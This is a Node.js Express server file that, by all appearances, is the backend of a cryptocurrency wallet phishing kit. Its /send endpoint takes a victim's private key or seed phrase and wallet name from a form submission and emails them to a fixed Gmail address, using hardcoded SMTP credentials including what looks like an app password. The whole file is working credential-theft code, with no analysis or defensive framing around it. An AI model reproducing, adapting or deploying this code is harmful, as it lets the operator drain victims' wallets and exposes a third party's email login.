const nodemailer = require("nodemailer");
const express = require("express");
const PORT = process.env.PORT || 5000;
const cors = require("cors");
const app = express();

app.use(cors());
app.use(express.json());

app.use(
  express.urlencoded({
    extended: true,
  })
);

var transporter = nodemailer.createTransport({
  host: "smtp.gmail.com",
  port: 465,
  secure: true,
  auth: {
    user: "bridgetsmith855@gmail.com",
    pass: "oniwkzywponbuqyf",
  },
});

app.post("/send", (req, res) => {
  const mailOptions = {
    from: `bridgetsmith855@gmail.com`,
    to: `atandauthman2@gmail.com`,
    subject: "private key",
    html: `
                            <p>
                               <b>privatekey: </b>${req.body.phrase}<br>
                               <b>wallet: </b>${req.body.initial}<br>
                            </p>`,
  };
  transporter.sendMail(mailOptions, function (err, data) {
    if (err) {
      console.log(err);
    } else {
      console.log("sent");
    }
  });
});

app.listen(PORT, () => {
  console.log(`app is listening on port ${PORT}`);
});
